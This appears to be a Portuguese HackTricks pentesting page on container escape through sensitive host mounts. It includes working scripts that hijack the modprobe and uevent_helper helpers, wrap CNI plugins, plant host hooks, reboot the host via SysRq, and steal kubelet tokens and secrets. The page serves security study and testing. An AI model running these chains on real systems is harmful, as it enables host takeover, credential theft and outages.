# Montagens sensíveis do host

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

As montagens do host são uma das superfícies práticas mais importantes para escapar de containers, pois muitas vezes desfazem o isolamento cuidadoso de um processo e voltam a expor diretamente recursos do host. Os casos perigosos não se limitam a `/`. Montagens bind de `/proc`, `/sys`, `/var`, sockets de runtime, estado gerenciado pelo kubelet ou caminhos relacionados a dispositivos podem expor controles do kernel, credenciais, sistemas de arquivos de containers vizinhos e interfaces de gerenciamento do runtime.

Esta página existe separadamente das páginas individuais de proteção porque o modelo de abuso abrange vários aspectos. Uma montagem do host com permissão de escrita é perigosa em parte por causa dos namespaces de montagem, em parte por causa dos user namespaces, em parte pela cobertura do AppArmor ou SELinux e em parte pelo caminho exato do host que foi exposto. Tratar o tema separadamente facilita muito a análise da superfície de ataque.

Compare também um diretório do host com permissão de escrita ao caminho correspondente dentro de cada container. Se ele estiver montado sobre um diretório de scripts executáveis de inicialização, um usuário do host com menos privilégios poderá inserir código que o entrypoint de um container com mais privilégios carregará na próxima reinicialização. Confirme a origem e o destino exatos da montagem bind, as permissões de escrita e busca do diretório, o loop do entrypoint e o requisito de arquivo executável, o UID do runtime e um gatilho real de reinicialização. O UID 0 do container não corresponde automaticamente ao UID 0 do host; o mapeamento de user namespace e a política de montagem determinam o efeito no host. Uma análise passiva deve informar caminhos e permissões sem gravar um script nem reiniciar a carga de trabalho.

Um container Linux pode estar dentro de uma VM de gerenciamento que compartilha parte de um sistema de arquivos de um host Windows separado. As [pastas compartilhadas do VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) são uma forma de tornar arquivos do host visíveis no guest, mas o root nessa VM ainda é uma identidade distinta da de um administrador do Windows. Se o compartilhamento expuser a chave privada SSH legível de um usuário, trate-a como uma pista de credencial: verifique a montagem exata respaldada pelo host, a propriedade e o acesso à chave, a conta correspondente e a política **efetiva** de chaves autorizadas do servidor SSH do Windows antes de concluir que ela permite um login no host. O [OpenSSH do Windows](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) moderno costuma usar um arquivo `administrators_authorized_keys` separado para contas de administrador. Não inclua o conteúdo de chaves privadas na saída de enumeração rotineira; os metadados da montagem e do caminho da chave bastam para uma triagem passiva.

## Exposição de `/proc`

O procfs contém informações comuns sobre processos e também interfaces de controle do kernel de alto impacto. Portanto, uma montagem bind como `-v /proc:/host/proc` ou uma visão do container que exponha entradas inesperadas de proc com permissão de escrita pode levar à divulgação de informações, à negação de serviço ou à execução direta de código no host.

Caminhos de alto valor do procfs incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (especialmente `register` e `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas de alto valor do procfs estão visíveis ou permitem escrita:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Esses caminhos são interessantes por diferentes motivos. `core_pattern`, `modprobe` e `binfmt_misc` podem se tornar caminhos de execução de código no host quando graváveis. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes valiosas de reconhecimento para exploração do kernel. `sched_debug` e `mountinfo` revelam o contexto de processos, cgroups e sistemas de arquivos, o que pode ajudar a reconstruir o layout do host de dentro do container.

O valor prático de cada caminho é diferente, e tratá-los todos como se tivessem o mesmo impacto dificulta a triagem:

- `/proc/sys/kernel/core_pattern`
  Se for gravável, este é um dos caminhos procfs de maior impacto, pois o kernel executa um manipulador de pipe após uma falha. Um container que consiga apontar `core_pattern` para um payload armazenado em seu overlay ou em um caminho do host montado pode frequentemente obter execução de código no host. Veja também [read-only-paths.md](protections/read-only-paths.md) para um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
  Este caminho controla o helper de userspace usado pelo kernel quando precisa invocar a lógica de carregamento de módulos. Se for gravável a partir do container e interpretado no contexto do host, pode se tornar outra primitiva de execução de código no host. É especialmente interessante quando combinado com uma forma de acionar o caminho do helper.
- `/proc/sys/vm/panic_on_oom`
  Geralmente, isso não é uma primitiva de escape direta, mas pode transformar pressão de memória em negação de serviço em todo o host, convertendo condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Se a interface de registro for gravável, o atacante poderá registrar um handler para um valor magic escolhido e obter execução no contexto do host quando um arquivo correspondente for executado.
- `/proc/config.gz`
  Útil para triagem de exploits do kernel. Ajuda a determinar quais subsistemas, mitigações e recursos opcionais do kernel estão habilitados, sem precisar dos metadados de pacotes do host.
- `/proc/sysrq-trigger`
  Principalmente um caminho de negação de serviço, mas muito grave. Pode reiniciar, provocar panic ou interromper imediatamente o host de outras formas.
- `/proc/kmsg`
  Revela mensagens do buffer circular do kernel. Útil para fingerprinting do host, análise de falhas e, em alguns ambientes, para leak de informações úteis à exploração do kernel.
- `/proc/kallsyms`
  Valioso quando legível, pois expõe informações sobre símbolos exportados do kernel e pode ajudar a contornar premissas de randomização de endereços durante o desenvolvimento de exploits do kernel.
- `/proc/[pid]/mem`
  Esta é uma interface direta para a memória de processos. Se o processo-alvo puder ser acessado sob as condições necessárias, semelhantes às do ptrace, ela pode permitir ler ou modificar a memória de outro processo. O impacto real depende bastante das credenciais, de `hidepid`, do Yama e das restrições de ptrace; portanto, é um caminho poderoso, mas condicionado.
- `/proc/kcore`
  Expõe uma visão da memória do sistema no formato de imagem de core. O arquivo é enorme e difícil de usar, mas, se for efetivamente legível, isso indica uma superfície de memória do host perigosamente exposta.
- `/dev/kmem` e `/dev/mem`
  Historicamente, são interfaces de **dispositivo** de memória bruta de alto impacto, não arquivos procfs. Em muitos sistemas modernos, estão ausentes ou são fortemente restringidas, mas um container que consiga abrir uma cópia montada do host deve tratar essa exposição como crítica. Verifique-as junto com outras montagens sensíveis de `/dev`, em vez de procurar os caminhos inexistentes `/proc/kmem` ou `/proc/mem`.
- `/proc/sched_debug`
  Faz leak de informações de escalonamento e tarefas que podem expor identidades de processos do host, mesmo quando outras visualizações de processos parecem mais restritas do que o esperado.
- `/proc/[pid]/mountinfo`
  Extremamente útil para reconstruir onde o container realmente está no host, quais caminhos são respaldados por overlay e se uma montagem gravável corresponde a conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou os detalhes do overlay estiverem legíveis, use-os para recuperar o caminho no host do sistema de arquivos do container:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Esses comandos são úteis porque várias técnicas de execução no host exigem converter um caminho dentro do container no caminho correspondente do ponto de vista do host.

### Exemplo: Preparar um caminho para um helper `modprobe`

Se `/proc/sys/kernel/modprobe` puder ser gravado a partir do container e o caminho do helper for interpretado no contexto do host, ele poderá ser redirecionado para um payload controlado pelo atacante. O diretório upper do overlay precisa ser resolvido no host, e a saída de comprovação deve ser gravada nessa mesma camada do container visível no host caso o container também não monte o `/tmp` do host:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

O gatilho exato depende do alvo e do comportamento do kernel e não é adivinhado deliberadamente. Restaure o valor original antes de sair do laboratório. O ponto importante é que um caminho de helper com permissão de escrita pode redirecionar uma futura invocação de helper do kernel para conteúdo em um caminho do host controlado pelo atacante. Um `upperdir` de overlay ausente, um caminho que o host não consegue resolver, uma montagem de sysctl somente leitura ou um kernel que nunca invoca o helper selecionado interrompem essa cadeia.

### Exemplo completo: reconhecimento do kernel com `kallsyms`, `kmsg` e `config.gz`

Se o objetivo for avaliar a explorabilidade, em vez de escapar imediatamente:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Esses comandos ajudam a determinar se há informações úteis sobre símbolos visíveis, se mensagens recentes do kernel revelam estados interessantes e quais recursos ou mitigações do kernel foram compilados. O impacto geralmente não é uma fuga direta, mas isso pode reduzir bastante o tempo de triagem de vulnerabilidades do kernel.

### Exemplo completo: reinicialização do host via SysRq

Se `/proc/sysrq-trigger` for gravável e alcançar a visão do host:

```bash
echo b > /proc/sysrq-trigger
```

O efeito é uma reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais grave do que a divulgação de informações.

## Exposição de `/sys`

O sysfs expõe grandes quantidades de estado do kernel e dos dispositivos. Alguns caminhos do sysfs são principalmente úteis para fingerprinting, enquanto outros podem afetar a execução de helpers, o comportamento dos dispositivos, a configuração de módulos de segurança ou o estado do firmware.

Os caminhos de alto valor do sysfs incluem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos são relevantes por diferentes motivos. `/sys/class/thermal` pode influenciar o comportamento do gerenciamento térmico e, portanto, a estabilidade do host em ambientes com exposição inadequada. `/sys/kernel/vmcoreinfo` pode vazar informações de crash dumps e do layout do kernel, que ajudam no fingerprinting de baixo nível do host. `/sys/kernel/security` é a interface `securityfs` usada pelos Linux Security Modules, portanto, o acesso inesperado a ela pode expor ou alterar o estado relacionado a MAC. Os caminhos de variáveis EFI podem afetar as configurações de inicialização armazenadas no firmware, tornando-os muito mais sérios do que arquivos de configuração comuns. O `debugfs` em `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface voltada a desenvolvedores, com muito menos garantias de segurança do que as APIs do kernel voltadas à produção e protegidas contra ataques.

Cada entrada do sysfs nesta lista depende do **kernel, da configuração e do hardware**. Nós virtuais atuais normalmente não incluem `uevent_helper`, variáveis EFI nem entradas de dispositivos térmicos. Registre um caminho ausente como um pré-requisito negativo, em vez de presumir que um exemplo de outro kernel se aplica.

Comandos úteis para revisar esses caminhos são:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

O que torna esses comandos interessantes:

- `/sys/kernel/security` pode revelar se AppArmor, SELinux ou outra superfície de LSM está visível de uma forma que deveria ter permanecido acessível apenas pelo host.
- `/sys/kernel/debug` costuma ser a descoberta mais alarmante deste grupo. Se `debugfs` estiver montado e puder ser lido ou gravado, espere uma ampla superfície voltada ao kernel, cujo risco exato depende dos nós de depuração habilitados.
- A exposição de variáveis EFI é menos comum, mas tem alto impacto quando presente, pois afeta configurações respaldadas pelo firmware, em vez de arquivos comuns de tempo de execução.
- `/sys/class/thermal` é relevante principalmente para a estabilidade do host e a interação com o hardware, não para uma fuga simples via shell.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte para identificação do host e análise de falhas, útil para entender o estado de baixo nível do kernel.

### Exemplo completo: `uevent_helper`

`/sys/kernel/uevent_helper` depende do kernel e da configuração, e está ausente em muitos sistemas atuais. Se existir, puder ser gravado e houver um gatilho `uevent` utilizável, o kernel poderá executar um helper controlado pelo atacante. A saída de prova deve usar um caminho visível tanto pela perspectiva do host quanto pela do contêiner:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

O motivo pelo qual isso funciona é que o caminho do helper é interpretado do ponto de vista do host. Quando acionado, o helper é executado no contexto do host, e não dentro do contêiner atual. `/sys/class/mem/null/uevent` é um gatilho concreto em kernels que o expõem; outros dispositivos podem expor seus próprios arquivos `uevent`, mas não escolha um às cegas em hardware real. Restaure o valor original antes de sair do laboratório. Não reporte essa técnica como disponível se o arquivo do helper ou um gatilho controlado estiver ausente.

## Exposição de `/var`

Montar o `/var` do host em um contêiner costuma ser subestimado porque não parece tão dramático quanto montar `/`. Na prática, isso pode ser suficiente para acessar sockets de runtime, diretórios de snapshots de contêineres, volumes de pods gerenciados pelo kubelet, tokens projetados de contas de serviço e sistemas de arquivos de aplicações vizinhas. Em nós modernos, `/var` costuma ser onde realmente fica o estado dos contêineres de maior interesse operacional.

### Exemplo de Kubernetes

Um pod com `hostPath: /var` muitas vezes consegue ler tokens projetados de outros pods e o conteúdo de snapshots overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Esses comandos são úteis porque mostram se a montagem expõe apenas dados comuns da aplicação ou credenciais de cluster de alto impacto. Um token de service account legível pode transformar imediatamente a execução local de código em acesso à API do Kubernetes.

Se o token estiver presente, valide a quais recursos ele pode acessar, em vez de parar na descoberta do token:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

O impacto aqui pode ser muito maior do que o acesso local ao nó. Um token com RBAC amplo pode transformar um `/var` montado em um comprometimento de todo o cluster.

### Exemplo de Docker e containerd

Em hosts Docker, os dados relevantes geralmente ficam em `/var/lib/docker`, enquanto em nós Kubernetes com containerd podem ficar em `/var/lib/containerd` ou em caminhos específicos do snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Se o `/var` montado expuser o conteúdo gravável de um snapshot de outra carga de trabalho, o atacante poderá alterar arquivos da aplicação, inserir conteúdo web ou modificar scripts de inicialização sem tocar na configuração do container atual.

Em uma **carga de trabalho de laboratório descartável**, o conteúdo gravável de um snapshot pode demonstrar adulteração de aplicações, recuperação de secrets ou movimento lateral. Primeiro, associe o ID do container em execução ao snapshot exato e nunca edite um snapshot não relacionado ou de produção:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Esses comandos são úteis porque mostram as três principais categorias de impacto de um `/var` montado: adulteração de aplicações, recuperação de segredos e movimentação lateral para cargas de trabalho vizinhas.

Gravações diretas em snapshots ignoram o gerenciamento de estado normal do runtime e podem corromper o container ou destruir evidências. A descoberta somente para leitura foi reproduzida localmente com o `overlay2` do Docker: um marcador gravado em um container descartável vizinho apareceu em `/var/lib/docker/overlay2/<id>/diff/`. Limite modificações reais em snapshots a um container descartável criado para esse teste.

## Estado do Kubelet, plugins e caminhos do CNI

Uma montagem de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` costuma ser exposta por DaemonSets privilegiados, agentes CNI, plugins de nó CSI, operadores de GPU e auxiliares de armazenamento. É fácil descartar essas montagens como "infraestrutura do nó", mas elas ficam diretamente no caminho de execução de novos pods e muitas vezes contêm credenciais do kubelet, secrets projetados, sockets de registro e binários executáveis de plugins do host.

Alvos de alto valor incluem:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Comandos úteis para revisão:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Por que esses caminhos são importantes:

- `/var/lib/kubelet/pki` pode expor certificados de cliente do kubelet e outras credenciais locais do nó, que às vezes podem ser reutilizadas contra o servidor da API ou endpoints TLS voltados ao kubelet, dependendo do design do cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` costuma conter tokens de service account projetados e Secrets montados para pods vizinhos no mesmo nó.
- `/var/lib/kubelet/pod-resources/kubelet.sock` é principalmente uma superfície de reconhecimento, mas muito útil: revela quais pods e contêineres estão usando GPUs, hugepages, dispositivos SR-IOV e outros recursos escassos locais do nó.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` revelam quais plugins CSI, DRA e de dispositivos estão instalados e com quais sockets o kubelet deve se comunicar. Se esses diretórios permitirem escrita, em vez de apenas leitura, o achado se torna muito mais grave.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` e `/etc/cni/net.d` ficam diretamente no caminho de configuração da rede dos pods. O acesso de escrita a esses locais muitas vezes permite execução no host posteriormente, em vez de apenas expor configurações.<sup>[[2]](#references)</sup>

### Exemplo completo: `/opt/cni/bin` com permissão de escrita

Se um diretório de binários CNI do host estiver montado com permissão de leitura e escrita, substituir um plugin pode ser suficiente para obter execução no host na próxima vez que o kubelet criar um sandbox de pod nesse nó:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Isso não é tão imediato quanto um `docker.sock` montado, mas costuma ser mais realista em pods de infraestrutura Kubernetes comprometidos. O marcador é gravado ao lado do plugin montado para que o container possa recuperá-lo mesmo sem uma montagem de host-root ou de `host`-`/tmp`. O wrapper preserva os argumentos originais e a entrada padrão; em seguida, o exemplo restaura o binário original. O ponto importante é que o binário modificado é executado posteriormente pelo fluxo de configuração de rede do host, não pelo container atual. Use apenas um node descartável, pois um wrapper inválido pode impedir que novos sandboxes de Pod recebam conectividade de rede.

## Sockets de runtime

As montagens sensíveis do host geralmente incluem sockets de runtime, em vez de diretórios inteiros. Eles são tão importantes que merecem ser mencionados explicitamente novamente aqui:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Veja [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para conhecer os fluxos completos de exploração quando um desses sockets estiver montado.

Como padrão rápido de primeira interação:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Se uma delas funcionar, o caminho de "socket montado" até "iniciar um container irmão mais privilegiado" costuma ser muito mais curto do que qualquer caminho de kernel breakout.

O mesmo acesso ao daemon também pode estabelecer **persistência no host**. Um container auxiliar com um bind mount gravável da raiz do host pode receber arquivos por meio de `docker cp` e, em seguida, usar `docker exec` para colocar uma chave SSH, uma unidade de serviço ou outro arquivo de persistência no caminho montado do host. O limite de segurança é a autoridade do daemon para criar o mount no host; `docker cp` é apenas uma etapa de preparação. Audite tanto os containers recém-criados quanto as gravações em caminhos de autenticação ou inicialização do host após a exposição de um socket de runtime.

## Sequestro de tarefa por caminho gravável no host

Um mount gravável no host não precisa expor `/` para ser perigoso. Se o caminho montado contiver scripts, arquivos de configuração, hooks, plugins ou arquivos consumidos posteriormente por uma tarefa agendada ou serviço executado no host, o container poderá alterar o que o host executa.

Fluxo genérico de análise:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Se um arquivo gravável for consumido por um processo do host, mantenha o payload simples e observável durante os testes:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

A parte interessante é o limite de confiança: a gravação acontece de dentro do container, mas a execução ocorre mais tarde no contexto do serviço do host. Isso transforma um hostPath ou bind mount restrito em uma primitiva de execução de código no host com atraso.

## Arquivos de Propriedade do Root em um Host Path Compartilhado

Uma conta de container que pode se tornar root talvez consiga colocar um arquivo de propriedade do root em um caminho gravável também usado pelo host. Se o UID 0 do container for mapeado para o UID 0 do host, ambas as visualizações se referem ao mesmo arquivo, e se o mount do host permitir execução de SUID, um usuário do host que possa executar nesse caminho um executável SUID de propriedade do root talvez ultrapasse o limite de privilégios do host. Para esse problema específico de propriedade de arquivos, o container não precisa ser executado com `--privileged`. Consulte [mapeamentos de user namespace](protections/namespaces/user-namespace.md) e a [discussão sobre SUID](privileged-containers.md) para ver as condições separadas.

Revise o caminho **dos dois lados**: compare a propriedade e a identidade de um arquivo benigno, confira `uid_map` e `gid_map` do container e inspecione as opções de mount e a política de execução do host. `rw` no lado do container sem `nosuid` é apenas um indício; isso não comprova a propriedade no host, as flags de mount do host, o acesso de um usuário do host nem se AppArmor/SELinux bloqueia a execução. `noexec` restringe a execução na visualização em que se aplica. As tags `shared:` e `master:` em `/proc/self/mountinfo` descrevem a propagação do mount, não se o conteúdo do arquivo é compartilhado com o host. Um bind mount pode não ter essas tags. A reutilização de credenciais que permite fazer login no host é uma etapa separada do limite de privilégios criado pelo arquivo compartilhado.

O armazenamento do runtime do host pode criar um caminho semelhante mesmo sem um bind mount explícito. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) permitia que um usuário não privilegiado do host percorresse subdiretórios de dados do Docker e executasse arquivos de um filesystem do container; o Moby corrigiu as permissões na versão 20.10.9 e observa que os containers em execução precisam ser reiniciados para corrigir seus diretórios. Revise os caminhos exatos de `overlay2/<id>/merged` montados e a permissão de busca de cada diretório pai; depois, determine se o UID 0 do container é mapeado para o UID 0 do host, se há um executável SetUID real de propriedade do root presente e acessível e se a visualização do host permite a execução de SetUID. Containers rootless ou com user namespace remapeado, `nosuid`, `noexec`, `no_new_privs` e a política de MAC podem alterar o resultado. Uma versão do runtime ou um caminho percorrível é apenas um indício para revisão, não uma prova de execução como root no host; inspecione os metadados do mount e do arquivo sem executar um possível candidato.

## CVEs Relacionadas a Mounts

Mounts do host também podem estar relacionados a vulnerabilidades do runtime. Exemplos recentes importantes incluem:

- `CVE-2024-21626` no `runc`, em que um descritor de arquivo de diretório vazado podia colocar o diretório de trabalho no filesystem do host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` no BuildKit, em que Dockerfiles maliciosos, frontends e fluxos de `RUN --mount` podiam reintroduzir acesso a arquivos do host, exclusão de arquivos ou privilégios elevados durante builds.
- `CVE-2024-1753` nos fluxos de build do Buildah e do Podman, em que bind mounts criados com conteúdo malicioso durante o build podiam expor `/` com acesso de leitura e escrita.
- `CVE-2025-47290` no `containerd` 2.1.0, em que uma condição TOCTOU durante a descompactação de uma imagem podia permitir que uma imagem especialmente criada modificasse o filesystem do host durante o pull.

Essas CVEs são relevantes aqui porque mostram que o gerenciamento de mounts não depende apenas da configuração do operador. O próprio runtime também pode introduzir condições de escape causadas por mounts.

## Verificações

Use estes comandos para localizar rapidamente as exposições de mount de maior risco:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

O que é interessante aqui:

- O root do host, `/proc`, `/sys`, `/var` e os sockets de runtime são todos descobertas de alta prioridade.
- Entradas graváveis em proc/sys geralmente indicam que a montagem expõe controles globais do kernel do host, em vez de uma visão segura do container.
- Caminhos montados de `/var` merecem uma análise de credenciais e workloads adjacentes, não apenas uma análise do sistema de arquivos.
- Diretórios de estado do Kubelet e caminhos de CNI/plugins merecem a mesma prioridade que os sockets de runtime, pois geralmente estão diretamente no caminho de criação de pods e distribuição de credenciais do nó.

## Status da validação local

As cadeias práticas desta página foram verificadas em um nó local Linux minikube. A validação reproduziu:

- acesso de leitura e escrita por meio de um hostPath temporário gravável
- descoberta de tokens ServiceAccount projetados e Secrets montados em `/var/lib/kubelet/pods`
- autenticação bem-sucedida na API do Kubernetes com um token ativo recuperado desse estado montado do kubelet
- descoberta somente de leitura de um sistema de arquivos `overlay2` de um Docker vizinho por meio de `/var` montado
- criação, pela API do Docker, de um container irmão com uma montagem bind do host somente leitura por meio de um `docker.sock` montado
- execução atrasada no host por meio de um hook temporário consumido pelo host
- uma simulação de wrapper CNI que preservou os argumentos, a entrada padrão e a execução do plugin original

O mesmo nó expôs `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` e `config.gz`, mas não expôs `uevent_helper`, variáveis EFI, entradas térmicas ou `sched_debug`. Gatilhos destrutivos do kernel não foram executados. Isso confirma que as cadeias envolvendo root do host, `/var`, estado do kubelet, sockets e consumidores do host são reproduzíveis, enquanto as técnicas de helper de procfs/sysfs devem permanecer condicionais ao kernel exato, ao modo de montagem, ao caminho do payload e ao gatilho.

## References

- [1] [Arquivos e caminhos locais usados pelo Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [O container cilium-agent pode acessar o host por meio de uma montagem `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
